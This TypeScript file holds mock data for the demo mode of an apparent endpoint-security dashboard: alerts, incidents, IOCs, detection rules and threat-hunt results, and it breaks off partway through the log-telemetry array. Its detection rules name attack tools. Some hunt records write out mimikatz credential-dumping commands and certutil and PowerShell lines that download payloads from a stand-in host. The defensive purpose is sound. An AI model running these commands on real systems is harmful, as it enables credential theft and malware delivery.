// Static mock data served when demo mode is active (backend offline).
// Credentials: demo@netcradus.com / Demo@1234

const _now = Date.now()
const hAgo = (h: number) => new Date(_now - h * 3_600_000).toISOString()
const dAgo = (d: number) => new Date(_now - d * 86_400_000).toISOString()

// ── Auth / current user ───────────────────────────────────────────────────────

export const DEMO_ME = {
  id: 9999,
  name: 'Demo Admin',
  email: 'demo@netcradus.com',
  is_active: true,
  email_verified: true,
  mfa_enabled: false,
  role: { id: 1, name: 'SuperAdmin' },
  tenant: { id: 9999, name: 'Netcradus Demo', is_active: true },
}

// ── Agents ────────────────────────────────────────────────────────────────────

const DEMO_AGENTS = [
  { id: 1, hostname: 'WIN-DC-01',       ip_address: '10.0.0.1',       os_type: 'Windows Server 2022', agent_version: '1.4.2', last_seen: hAgo(0.3),  status: 'Online',  agent_token: 'demo-1', tenant_id: 9999 },
  { id: 2, hostname: 'WIN-WORKST-01',   ip_address: '192.168.1.101',  os_type: 'Windows 11 Pro',      agent_version: '1.4.2', last_seen: hAgo(0.8),  status: 'Online',  agent_token: 'demo-2', tenant_id: 9999 },
  { id: 3, hostname: 'LINUX-WEB-01',    ip_address: '192.168.1.50',   os_type: 'Ubuntu 22.04 LTS',    agent_version: '1.4.1', last_seen: hAgo(0.1),  status: 'Online',  agent_token: 'demo-3', tenant_id: 9999 },
  { id: 4, hostname: 'WIN-LAPTOP-02',   ip_address: '192.168.1.105',  os_type: 'Windows 11 Home',     agent_version: '1.3.8', last_seen: dAgo(2),    status: 'Offline', agent_token: 'demo-4', tenant_id: 9999 },
  { id: 5, hostname: 'WIN-SERVER-02',   ip_address: '10.0.0.5',       os_type: 'Windows Server 2019', agent_version: '1.4.2', last_seen: hAgo(0.15), status: 'Online',  agent_token: 'demo-5', tenant_id: 9999 },
]

// ── Alerts ────────────────────────────────────────────────────────────────────

const DEMO_ALERTS = [
  { id: 1,  title: 'Encoded PowerShell Execution',          description: 'PowerShell was executed with Base64-encoded commands (-enc flag) indicating obfuscation.',                    severity: 'Critical', mitre_technique: 'T1059.001', status: 'Open',     occurrence_count: 3,  timestamp: hAgo(2),   agent_id: 1 },
  { id: 2,  title: 'LSASS Memory Dump Detected',            description: 'Process attempted to read LSASS memory — credential dumping behavior consistent with Mimikatz.',             severity: 'Critical', mitre_technique: 'T1003.001', status: 'Open',     occurrence_count: 1,  timestamp: hAgo(2.5), agent_id: 1 },
  { id: 3,  title: 'Mimikatz Tool Detected on Endpoint',    description: 'Command line contains "mimikatz" string — known credential theft and lateral movement tool.',                severity: 'Critical', mitre_technique: 'T1003.001', status: 'Open',     occurrence_count: 2,  timestamp: hAgo(3),   agent_id: 2 },
  { id: 4,  title: 'PsExec Lateral Movement Detected',      description: 'PsExec.exe was executed, indicating potential lateral movement to another system in the network.',            severity: 'High',     mitre_technique: 'T1570',     status: 'Open',     occurrence_count: 1,  timestamp: hAgo(4),   agent_id: 2 },
  { id: 5,  title: 'Outbound C2 Connection on Port 4444',   description: 'Outbound TCP connection to port 4444 detected — commonly used by Metasploit reverse shells.',               severity: 'High',     mitre_technique: 'T1571',     status: 'Open',     occurrence_count: 5,  timestamp: hAgo(5),   agent_id: 3 },
  { id: 6,  title: 'Registry Run Key Persistence',          description: 'A new Registry Run key was created under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.',          severity: 'High',     mitre_technique: 'T1547.001', status: 'Open',     occurrence_count: 1,  timestamp: hAgo(6),   agent_id: 1 },
  { id: 7,  title: 'IOC Match: malicious-c2.com',           description: 'Outbound DNS query matched a known-malicious domain in the active IOC database.',                            severity: 'High',     mitre_technique: 'T1071.001', status: 'Open',     occurrence_count: 12, timestamp: hAgo(7),   agent_id: 4 },
  { id: 8,  title: 'Suspicious File Drop in %TEMP%',        description: 'An executable was written to a Temp directory — common staging technique before execution.',                 severity: 'Medium',   mitre_technique: 'T1036',     status: 'Open',     occurrence_count: 1,  timestamp: hAgo(8),   agent_id: 3 },
  { id: 9,  title: 'New Service Created for Persistence',   description: 'A new Windows service was registered outside of patch windows — possible persistent access mechanism.',      severity: 'Medium',   mitre_technique: 'T1543.003', status: 'Open',     occurrence_count: 1,  timestamp: hAgo(10),  agent_id: 5 },
  { id: 10, title: 'Whoami Reconnaissance Detected',        description: 'whoami.exe executed — common first step in post-exploitation host reconnaissance.',                          severity: 'Low',      mitre_technique: 'T1033',     status: 'Open',     occurrence_count: 4,  timestamp: hAgo(12),  agent_id: 5 },
  { id: 11, title: 'Certutil LOLBin File Download',         description: 'certutil.exe used to download a remote file — common living-off-the-land binary abuse technique.',           severity: 'High',     mitre_technique: 'T1218',     status: 'Resolved', occurrence_count: 1,  timestamp: dAgo(1),   agent_id: 2 },
  { id: 12, title: 'Net User Account Enumeration',          description: '"net user" command executed to enumerate local and domain accounts for reconnaissance.',                      severity: 'Medium',   mitre_technique: 'T1087',     status: 'Resolved', occurrence_count: 2,  timestamp: dAgo(1.5), agent_id: 4 },
  { id: 13, title: 'Unusual After-Hours Login',             description: 'Successful interactive login outside of normal business hours from a privileged account.',                   severity: 'Low',      mitre_technique: 'T1078',     status: 'Resolved', occurrence_count: 1,  timestamp: dAgo(2),   agent_id: 3 },
  { id: 14, title: 'Internal Port Scan Detected',           description: 'Rapid sequential outbound port connections detected from endpoint — possible internal network reconnaissance.', severity: 'Low',   mitre_technique: 'T1046',     status: 'Resolved', occurrence_count: 1,  timestamp: dAgo(2.5), agent_id: 5 },
]

const DEMO_ALERT_STATS = { critical: 3, high: 5, medium: 3, low: 3, open: 10, resolved: 4 }

// ── Incidents ─────────────────────────────────────────────────────────────────

const LINKED_ALERTS_1 = DEMO_ALERTS.slice(0, 3).map((a) => ({
  ...a, agent_hostname: DEMO_AGENTS.find((g) => g.id === a.agent_id)?.hostname ?? null,
}))
const LINKED_ALERTS_2 = [DEMO_ALERTS[3], DEMO_ALERTS[4], DEMO_ALERTS[6]].map((a) => ({
  ...a, agent_hostname: DEMO_AGENTS.find((g) => g.id === a.agent_id)?.hostname ?? null,
}))
const LINKED_ALERTS_3 = [DEMO_ALERTS[5], DEMO_ALERTS[7], DEMO_ALERTS[8]].map((a) => ({
  ...a, agent_hostname: DEMO_AGENTS.find((g) => g.id === a.agent_id)?.hostname ?? null,
}))

const DEMO_INCIDENTS = [
  { id: 1, title: 'Credential Dumping Attack Chain',      description: 'Multiple credential-dumping tools detected across domain controller and workstation. LSASS targeted via Mimikatz and encoded PowerShell dropper.', severity: 'Critical', status: 'Investigating', tenant_id: 9999, assigned_to: null, mitre_tactics: 'TA0006,TA0002',  alert_count: 3, affected_endpoints: 2, root_cause: null, resolution_summary: null, containment_actions: null, lessons_learned: null, created_at: hAgo(3),   updated_at: hAgo(1),   resolved_at: null },
  { id: 2, title: 'C2 Beaconing and Lateral Movement',   description: 'Endpoint established persistent outbound connection to port 4444 followed by PsExec-based lateral movement. IOC match confirmed.',                severity: 'High',     status: 'Open',         tenant_id: 9999, assigned_to: null, mitre_tactics: 'TA0011,TA0008', alert_count: 3, affected_endpoints: 3, root_cause: null, resolution_summary: null, containment_actions: null, lessons_learned: null, created_at: hAgo(7),   updated_at: hAgo(5),   resolved_at: null },
  { id: 3, title: 'Multi-Stage Persistence Chain',       description: 'Registry Run key and Windows service created in sequence following suspicious file drop in Temp directory. Persistence chain successfully disrupted.', severity: 'Medium', status: 'Resolved',     tenant_id: 9999, assigned_to: null, mitre_tactics: 'TA0003',        alert_count: 3, affected_endpoints: 2, root_cause: 'Phishing email delivered macro-enabled document that dropped a stager into %TEMP%, then established persistence via Run key and service.', resolution_summary: 'Stager binary quarantined, Run key and service removed, affected accounts reset.', containment_actions: 'Quarantined C:\\Temp\\drop.exe on LINUX-WEB-01; deleted HKCU Run key entry; stopped and deleted "NetSvc32" service on WIN-SERVER-02.', lessons_learned: 'Enable macro blocking policy for Office suite. Add TEMP directory write alerting for non-installer processes.', created_at: dAgo(1.5), updated_at: dAgo(0.5), resolved_at: dAgo(0.5) },
]

const _demoNotes1 = [
  { id: 101, user_name: 'Demo Admin', note_type: 'finding' as const,      content: 'Confirmed LSASS dump via Mimikatz sekurlsa::logonpasswords. Hash for DOMAIN\\Administrator captured — lateral movement risk is HIGH.', created_at: hAgo(2.5) },
  { id: 102, user_name: 'Demo Admin', note_type: 'action_taken' as const,  content: 'Killed mimikatz.exe process on WIN-DC-01 via remote command. Process confirmed terminated.', created_at: hAgo(2.2) },
  { id: 103, user_name: 'Jane Smith', note_type: 'ioc_ref' as const,       content: '185.220.101.42 — Tor exit node, confirmed C2 endpoint. Added to block list.', created_at: hAgo(1.8) },
]

const _demoNotes3 = [
  { id: 301, user_name: 'Bob Chen',   note_type: 'finding' as const,      content: 'Stager binary located at C:\\Temp\\drop.exe — SHA256 matches known LockBit dropper in VirusTotal (72 engines).', created_at: dAgo(1.4) },
  { id: 302, user_name: 'Demo Admin', note_type: 'action_taken' as const,  content: 'File quarantined via agent command. Service "NetSvc32" stopped and deleted on WIN-SERVER-02.', created_at: dAgo(1.2) },
  { id: 303, user_name: 'Demo Admin', note_type: 'note' as const,          content: 'All affected user accounts have been reset. No evidence of data exfiltration found in outbound traffic logs.', created_at: dAgo(0.8) },
]

const _demoEvidence1 = [
  { id: 201, added_by_name: 'Demo Admin', title: 'mimikatz.exe command output',     evidence_type: 'command_output' as const, content: '  .#####.   mimikatz 2.2.0 (x64)\n  .## ^ ##.  "A La Vie, A L\'Amour"\n  ## / \\  ##  /*** Benjamin DELPY\nsekurlsa::logonpasswords\nAuthentication Id : 0 ; 12345 (00000000:00003039)\n[00000003] Primary\n * Username : Administrator\n * Domain   : CORP\n * NTLM     : aad3b435b51404eeaad3b435b51404ee', created_at: hAgo(2.4) },
  { id: 202, added_by_name: 'Jane Smith', title: '185.220.101.42',                  evidence_type: 'ioc_ref' as const,        content: '185.220.101.42', created_at: hAgo(1.9) },
  { id: 203, added_by_name: 'Demo Admin', title: 'LSASS access event log snippet',  evidence_type: 'log_snippet' as const,    content: 'TimeCreated: 2026-06-30T08:23:14Z\nEventId: 10\nSourceImage: C:\\Windows\\Temp\\svhost.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1fffff\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll', created_at: hAgo(2.1) },
]

const _demoEvidence3 = [
  { id: 301, added_by_name: 'Bob Chen',   title: 'C:\\Temp\\drop.exe SHA256',        evidence_type: 'ioc_ref' as const,        content: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', created_at: dAgo(1.3) },
  { id: 302, added_by_name: 'Demo Admin', title: 'Registry Run key entry',           evidence_type: 'artifact' as const,       content: null, created_at: dAgo(1.1) },
]

const DEMO_INCIDENT_DETAILS = [
  { ...DEMO_INCIDENTS[0], alerts: LINKED_ALERTS_1, notes: _demoNotes1, evidence: _demoEvidence1 },
  { ...DEMO_INCIDENTS[1], alerts: LINKED_ALERTS_2, notes: [], evidence: [] },
  { ...DEMO_INCIDENTS[2], alerts: LINKED_ALERTS_3, notes: _demoNotes3, evidence: _demoEvidence3 },
]

const DEMO_INCIDENT_STATS = { total: 3, open: 1, investigating: 1, contained: 0, resolved: 1, critical: 1, high: 1 }

// ── IOCs ──────────────────────────────────────────────────────────────────────

const DEMO_IOCS = [
  { id: 1, type: 'Domain',   value: 'malicious-c2.com',                                        description: 'Known C2 domain used in APT campaigns',         category: 'C2',                severity: 'High',     source: 'AlienVault OTX', created_by: 'demo@netcradus.com', created_at: dAgo(5),   expires_at: null,    is_active: true,  enrichment_status: 'done', vt_score: 88 },
  { id: 2, type: 'IPv4',     value: '185.220.101.42',                                          description: 'Tor exit node with high abuse score',            category: 'C2',                severity: 'Critical', source: 'AbuseIPDB',      created_by: 'demo@netcradus.com', created_at: dAgo(4),   expires_at: null,    is_active: true,  enrichment_status: 'done', vt_score: 95 },
  { id: 3, type: 'SHA256',   value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', description: 'Ransomware dropper — LockBit variant',  category: 'Ransomware',        severity: 'High',     source: 'VirusTotal',     created_by: 'demo@netcradus.com', created_at: dAgo(3),   expires_at: null,    is_active: true,  enrichment_status: 'done', vt_score: 72 },
  { id: 4, type: 'Filename', value: 'mimikatz.exe',                                            description: 'Credential harvesting tool',                     category: 'Credential Access', severity: 'Critical', source: 'Manual',         created_by: 'demo@netcradus.com', created_at: dAgo(10),  expires_at: null,    is_active: true,  enrichment_status: 'done', vt_score: 99 },
  { id: 5, type: 'Email',    value: 'phish@evil-domain.com',                                   description: 'Phishing sender identified in campaign',         category: 'Phishing',          severity: 'Medium',   source: 'Manual',         created_by: 'demo@netcradus.com', created_at: dAgo(7),   expires_at: dAgo(-30), is_active: true,  enrichment_status: null,   vt_score: null },
]

// ── Detection Rules ───────────────────────────────────────────────────────────

const _ruleBase = { is_system: true, tenant_id: null, enabled: true, created_at: dAgo(30), updated_at: dAgo(30) }

const DEMO_DETECTION_RULES = [
  { id: 1,  name: 'Encoded PowerShell',              description: 'Detects PowerShell executed with Base64-encoded payload',       rule_type: 'process',     field: 'cmdline',         operator: 'contains',     value: '-enc',         severity: 'Critical', mitre_tactic: 'Execution',            mitre_technique: 'T1059.001', ..._ruleBase },
  { id: 2,  name: 'Mimikatz Credential Dump',        description: 'Detects mimikatz string in command line',                       rule_type: 'process',     field: 'cmdline',         operator: 'contains',     value: 'mimikatz',     severity: 'Critical', mitre_tactic: 'Credential Access',    mitre_technique: 'T1003.001', ..._ruleBase },
  { id: 3,  name: 'LSASS sekurlsa Module',           description: 'Detects sekurlsa module call used to dump LSASS credentials',   rule_type: 'process',     field: 'cmdline',         operator: 'contains',     value: 'sekurlsa',     severity: 'Critical', mitre_tactic: 'Credential Access',    mitre_technique: 'T1003.001', ..._ruleBase },
  { id: 4,  name: 'PsExec Lateral Movement',         description: 'Detects PsExec execution for lateral movement',                 rule_type: 'process',     field: 'process_name',    operator: 'contains',     value: 'psexec',       severity: 'High',     mitre_tactic: 'Lateral Movement',     mitre_technique: 'T1570',     ..._ruleBase },
  { id: 5,  name: 'Certutil LOLBin Abuse',           description: 'Detects certutil used to download or decode files',             rule_type: 'process',     field: 'process_name',    operator: 'contains',     value: 'certutil',     severity: 'High',     mitre_tactic: 'Defense Evasion',      mitre_technique: 'T1218',     ..._ruleBase },
  { id: 6,  name: 'Mshta Script Execution',          description: 'Detects mshta.exe used to execute HTA scripts',                 rule_type: 'process',     field: 'process_name',    operator: 'contains',     value: 'mshta.exe',    severity: 'High',     mitre_tactic: 'Execution',            mitre_technique: 'T1218.005', ..._ruleBase },
  { id: 7,  name: 'WMIC LOLBin Execution',           description: 'Detects WMIC used for reconnaissance or lateral movement',      rule_type: 'process',     field: 'process_name',    operator: 'contains',     value: 'wmic.exe',     severity: 'Medium',   mitre_tactic: 'Execution',            mitre_technique: 'T1047',     ..._ruleBase },
  { id: 8,  name: 'Net User Enumeration',            description: 'Detects net user command for account enumeration',              rule_type: 'process',     field: 'cmdline',         operator: 'contains',     value: 'net user',     severity: 'Medium',   mitre_tactic: 'Discovery',            mitre_technique: 'T1087',     ..._ruleBase },
  { id: 9,  name: 'Whoami Reconnaissance',           description: 'Detects whoami.exe execution for user/privilege discovery',     rule_type: 'process',     field: 'process_name',    operator: 'equals',       value: 'whoami.exe',   severity: 'Low',      mitre_tactic: 'Discovery',            mitre_technique: 'T1033',     ..._ruleBase },
  { id: 10, name: 'Metasploit Port 4444 C2',         description: 'Detects outbound connections to port 4444 (Metasploit default)',rule_type: 'network',     field: 'remote_port',     operator: 'equals',       value: '4444',         severity: 'Critical', mitre_tactic: 'Command and Control',  mitre_technique: 'T1571',     ..._ruleBase },
  { id: 11, name: 'Suspicious Port 1337',            description: 'Detects outbound connections to port 1337',                     rule_type: 'network',     field: 'remote_port',     operator: 'equals',       value: '1337',         severity: 'High',     mitre_tactic: 'Command and Control',  mitre_technique: 'T1571',     ..._ruleBase },
  { id: 12, name: 'IRC Botnet Port 6667',            description: 'Detects outbound IRC connections used by botnets',              rule_type: 'network',     field: 'remote_port',     operator: 'equals',       value: '6667',         severity: 'High',     mitre_tactic: 'Command and Control',  mitre_technique: 'T1071.003', ..._ruleBase },
  { id: 13, name: 'Executable in Temp Directory',    description: 'Detects files written to Temp directories',                     rule_type: 'file',        field: 'file_path',       operator: 'contains',     value: '\\temp\\',     severity: 'High',     mitre_tactic: 'Defense Evasion',      mitre_technique: 'T1036',     ..._ruleBase },
  { id: 14, name: 'AppData File Write',              description: 'Detects executable writes to AppData directories',              rule_type: 'file',        field: 'file_path',       operator: 'contains',     value: 'appdata',      severity: 'Medium',   mitre_tactic: 'Defense Evasion',      mitre_technique: 'T1036',     ..._ruleBase },
  { id: 15, name: 'Registry Run Key Persistence',    description: 'Detects entries added to Registry Run keys for persistence',    rule_type: 'persistence', field: 'entry_path',      operator: 'contains',     value: 'CurrentVersion\\Run', severity: 'High', mitre_tactic: 'Persistence',        mitre_technique: 'T1547.001', ..._ruleBase },
  { id: 16, name: 'Suspicious Service Creation',     description: 'Detects new Windows services created for persistence',          rule_type: 'persistence', field: 'persistence_type',operator: 'equals',       value: 'service',      severity: 'Medium',   mitre_tactic: 'Persistence',          mitre_technique: 'T1543.003', ..._ruleBase },
  { id: 17, name: 'Cron Job Persistence',            description: 'Detects new cron jobs added for Linux/macOS persistence',       rule_type: 'persistence', field: 'persistence_type',operator: 'equals',       value: 'cron',         severity: 'Medium',   mitre_tactic: 'Persistence',          mitre_technique: 'T1053.003', ..._ruleBase },
]

// ── Feed config ───────────────────────────────────────────────────────────────

const DEMO_FEED_CONFIG = {
  virustotal_api_key: null, abuseipdb_api_key: null, otx_api_key: null,
  has_virustotal: false, has_abuseipdb: false, has_otx: false,
}

// ── Notifications config ──────────────────────────────────────────────────────

const DEMO_NOTIF_CONFIG = {
  slack_webhook_url: null, teams_webhook_url: null,
  email_to: null, email_smtp_host: null, email_smtp_port: null,
  email_smtp_user: null, email_smtp_pass: null, email_smtp_from: null,
  email_use_tls: false,
  notify_on_critical: true, notify_on_high: true,
  notify_on_new_incident: true, notify_on_agent_offline: true,
}

// ── Audit logs ────────────────────────────────────────────────────────────────

const DEMO_AUDIT_LOGS = [
  { id: 1, user_name: 'Demo Admin', action: 'login',              resource_type: 'User',          resource_id: 9999, details: 'Successful login',                          timestamp: hAgo(0.5)  },
  { id: 2, user_name: 'Demo Admin', action: 'resolve_alert',      resource_type: 'Alert',         resource_id: 11,   details: 'Alert resolved: Certutil LOLBin Download',  timestamp: dAgo(1)    },
  { id: 3, user_name: 'Demo Admin', action: 'create_ioc',         resource_type: 'IOC',           resource_id: 5,    details: 'IOC created: phish@evil-domain.com (Email)', timestamp: dAgo(2)    },
  { id: 4, user_name: 'Demo Admin', action: 'toggle_rule',        resource_type: 'DetectionRule', resource_id: 7,    details: 'Rule enabled: WMIC LOLBin Execution',        timestamp: dAgo(3)    },
  { id: 5, user_name: 'Demo Admin', action: 'update_feed_config', resource_type: 'ThreatFeed',    resource_id: null, details: 'Threat feed configuration updated',          timestamp: dAgo(4)    },
  { id: 6, user_name: 'Demo Admin', action: 'close_incident',     resource_type: 'Incident',      resource_id: 3,    details: 'Incident resolved: Multi-Stage Persistence', timestamp: dAgo(0.5)  },
  { id: 7, user_name: 'Demo Admin', action: 'create_command',     resource_type: 'Command',       resource_id: 1,    details: 'Kill process: mimikatz.exe on WIN-DC-01',    timestamp: dAgo(1.2)  },
]

// ── Response commands ─────────────────────────────────────────────────────────

const DEMO_COMMANDS = [
  { id: 1, command_type: 'kill_process',   argument: 'mimikatz.exe',    status: 'Completed', result: 'Process terminated successfully', error: null, timestamp: dAgo(1.2),  completed_at: dAgo(1.19), agent_id: 1, agent_hostname: 'WIN-DC-01'     },
  { id: 2, command_type: 'isolate_host',   argument: '',                status: 'Completed', result: 'Host isolated from network',      error: null, timestamp: dAgo(1),    completed_at: dAgo(0.99), agent_id: 2, agent_hostname: 'WIN-WORKST-01'  },
  { id: 3, command_type: 'block_ip',       argument: '185.220.101.42',  status: 'Completed', result: 'IP blocked at host firewall',      error: null, timestamp: dAgo(0.8),  completed_at: dAgo(0.79), agent_id: 3, agent_hostname: 'LINUX-WEB-01'   },
  { id: 4, command_type: 'restore_host',   argument: '',                status: 'Completed', result: 'Host restored to network',        error: null, timestamp: dAgo(0.5),  completed_at: dAgo(0.49), agent_id: 2, agent_hostname: 'WIN-WORKST-01'  },
  { id: 5, command_type: 'quarantine_file',argument: 'C:\\Temp\\drop.exe', status: 'Completed', result: 'File quarantined',            error: null, timestamp: dAgo(0.3),  completed_at: dAgo(0.29), agent_id: 3, agent_hostname: 'LINUX-WEB-01'   },
]

// ── Users / team ──────────────────────────────────────────────────────────────

const DEMO_USERS = [
  { id: 9999, name: 'Demo Admin', email: 'demo@netcradus.com', is_active: true, email_verified: true, mfa_enabled: false, role: { id: 1, name: 'SuperAdmin' }, tenant: { id: 9999, name: 'Netcradus Demo', is_active: true } },
  { id: 2,    name: 'Jane Smith', email: 'jane.smith@demo.com', is_active: true, email_verified: true, mfa_enabled: true,  role: { id: 2, name: 'Admin' },      tenant: { id: 9999, name: 'Netcradus Demo', is_active: true } },
  { id: 3,    name: 'Bob Chen',   email: 'bob.chen@demo.com',   is_active: true, email_verified: true, mfa_enabled: false, role: { id: 4, name: 'Analyst' },    tenant: { id: 9999, name: 'Netcradus Demo', is_active: true } },
  { id: 4,    name: 'Carol Davis',email: 'carol.davis@demo.com',is_active: true, email_verified: false,mfa_enabled: false, role: { id: 5, name: 'Viewer' },     tenant: { id: 9999, name: 'Netcradus Demo', is_active: true } },
]

// ── Reports summary ───────────────────────────────────────────────────────────

const _trend30d = Array.from({ length: 30 }, (_, i) => {
  const date = new Date(_now - (29 - i) * 86_400_000)
  const label = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' })
  const count = [0, 1, 0, 2, 1, 0, 3, 0, 1, 2, 0, 0, 1, 4, 2, 1, 0, 3, 1, 2, 5, 3, 2, 1, 4, 6, 3, 5, 4, 3][i]
  return { date: label, count }
})

const DEMO_REPORT_SUMMARY = {
  alerts:    { total: 14, open: 10, resolved: 4, by_severity: { Critical: 3, High: 5, Medium: 3, Low: 3 } },
  incidents: { total: 3,  open: 1,  resolved: 1, mttr_hours: 18 },
  agents:    { total: 5,  online: 4 },
  commands:  { total: 5,  completed: 5 },
  trend_30d: _trend30d,
  top_mitre: [
    { technique: 'T1003.001', count: 3 },
    { technique: 'T1547.001', count: 2 },
    { technique: 'T1571',     count: 2 },
    { technique: 'T1059.001', count: 1 },
    { technique: 'T1570',     count: 1 },
  ],
}

// ── Org info ──────────────────────────────────────────────────────────────────

const DEMO_ORG = { id: 9999, name: 'Netcradus Demo', api_key: 'demo-api-key-****', is_active: true }

// ── Threat Hunt mock data ──────────────────────────────────────────────────────

const DEMO_HUNT_PROCESS = {
  query: { name: 'mimikatz', days: 7 },
  total: 3,
  hits: [
    { id: 1, agent_id: 1, agent_hostname: 'WIN-DC-01',      pid: 4892, ppid: 4200, process_name: 'mimikatz.exe',    parent_process_name: 'cmd.exe', cmdline: 'mimikatz.exe "sekurlsa::logonpasswords" exit', exe_path: 'C:\\Windows\\Temp\\mimikatz.exe',  username: 'CORP\\Administrator', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', timestamp: hAgo(2.5) },
    { id: 2, agent_id: 2, agent_hostname: 'WIN-WORKST-01',  pid: 3120, ppid: 2800, process_name: 'mimikatz.exe',    parent_process_name: 'explorer.exe', cmdline: 'mimikatz.exe privilege::debug sekurlsa::wdigest', exe_path: 'C:\\Users\\Public\\mimikatz.exe', username: 'CORP\\jdoe', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', timestamp: hAgo(3.1) },
    { id: 3, agent_id: 1, agent_hostname: 'WIN-DC-01',      pid: 5504, ppid: 4892, process_name: 'powershell.exe',  parent_process_name: 'mimikatz.exe', cmdline: 'powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0', exe_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', username: 'CORP\\Administrator', sha256: null, timestamp: hAgo(2.4) },
  ],
}

const DEMO_HUNT_HASH = {
  query: { value: 'e3b0c44298fc1c149afbf4c8996fb924', days: 30 },
  total: 4,
  unique_agents: 2,
  hits: [
    { source: 'process', id: 1, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: 'mimikatz.exe', cmdline: 'mimikatz.exe "sekurlsa::logonpasswords"', exe_path: 'C:\\Windows\\Temp\\mimikatz.exe',  sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: null, file_path: null, event_type: null, timestamp: hAgo(2.5) },
    { source: 'process', id: 2, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: 'mimikatz.exe', cmdline: 'mimikatz.exe privilege::debug', exe_path: 'C:\\Users\\Public\\mimikatz.exe',            sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: null, file_path: null, event_type: null, timestamp: hAgo(3.1) },
    { source: 'file',    id: 5, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: null, cmdline: null, exe_path: null, sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: '098f6bcd4621d373cade4e832627b4f6', file_path: 'C:\\Windows\\Temp\\mimikatz.exe',  event_type: 'create', timestamp: hAgo(4) },
    { source: 'file',    id: 6, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: null, cmdline: null, exe_path: null, sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: '098f6bcd4621d373cade4e832627b4f6', file_path: 'C:\\Users\\Public\\mimikatz.exe', event_type: 'create', timestamp: hAgo(5) },
  ],
}

const DEMO_HUNT_IP = {
  query: { value: '185.220.101.42', port: null, days: 7 },
  summary: {
    unique_agents:     3,
    total_connections: 17,
    unique_ports:      [443, 4444, 8080],
    first_seen:        hAgo(7),
    last_seen:         hAgo(1),
  },
  total: 5,
  hits: [
    { id: 10, agent_id: 1, agent_hostname: 'WIN-DC-01',     local_ip: '10.0.0.1',      remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(1.2) },
    { id: 11, agent_id: 2, agent_hostname: 'WIN-WORKST-01', local_ip: '192.168.1.101', remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(2.8) },
    { id: 12, agent_id: 3, agent_hostname: 'LINUX-WEB-01',  local_ip: '192.168.1.50',  remote_ip: '185.220.101.42', remote_port: 443,  protocol: 'TCP', timestamp: hAgo(3.5) },
    { id: 13, agent_id: 1, agent_hostname: 'WIN-DC-01',     local_ip: '10.0.0.1',      remote_ip: '185.220.101.42', remote_port: 8080, protocol: 'TCP', timestamp: hAgo(5) },
    { id: 14, agent_id: 3, agent_hostname: 'LINUX-WEB-01',  local_ip: '192.168.1.50',  remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(7) },
  ],
}

const DEMO_HUNT_DOMAIN = {
  query: { value: 'malicious-c2.com', days: 7 },
  total: 3,
  unique_agents: 2,
  hits: [
    { source: 'process_cmdline', id: 20, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: 'powershell.exe', cmdline: 'powershell.exe Invoke-WebRequest http://malicious-c2.com/stage2.ps1 -OutFile C:\\Temp\\stage2.ps1', username: 'CORP\\Administrator', file_path: null, event_type: null, timestamp: hAgo(2) },
    { source: 'process_cmdline', id: 21, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: 'cmd.exe',        cmdline: 'certutil.exe -urlcache -split -f http://malicious-c2.com/payload.exe C:\\Temp\\payload.exe',          username: 'CORP\\jdoe',          file_path: null, event_type: null, timestamp: hAgo(3.5) },
    { source: 'file_path',       id: 22, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: null,             cmdline: null, username: null, file_path: 'C:\\Temp\\malicious-c2.com_payload.exe', event_type: 'create', timestamp: hAgo(2.1) },
  ],
}

const DEMO_HUNT_PERSISTENCE = {
  query: { persistence_type: 'registry', days: 7 },
  total: 2,
  hits: [
    { id: 30, agent_id: 1, agent_hostname: 'WIN-DC-01',     persistence_type: 'registry', entry_name: 'WindowsUpdate', entry_path: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate', timestamp: hAgo(6) },
    { id: 31, agent_id: 5, agent_hostname: 'WIN-SERVER-02', persistence_type: 'service',  entry_name: 'NetSvc32',      entry_path: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetSvc32',                    timestamp: hAgo(9) },
  ],
}

// ── Log Telemetry mock data ───────────────────────────────────────────────────

const DEMO_LOG_TELEMETRY = {
  total: 12,
  items: [
    { id: 1,  agent_id: 1, log_source: 'wineventlog', severity: 'critical', event_id: 1102, hostname: 'WIN-DC-01',     username: 'Administrator', source_ip: null,              log_message: 'EventID=1102 | Source=Microsoft-Windows-Eventlog | User=Administrator', timestamp: hAgo(1) },
    { id: 2,  agent_id: 2, log_source: 'wineventlog', severity: 'high',     event_id: 4625, hostname: 'WIN-WORKST-01', username: 'jsmith',         source_ip: '185.220.101.42',  log_message: 'EventID=4625 | Source=Microsoft-Windows-Security-Auditing | User=jsmith | IP=185.220.101.42', timestamp: hAgo(2) },
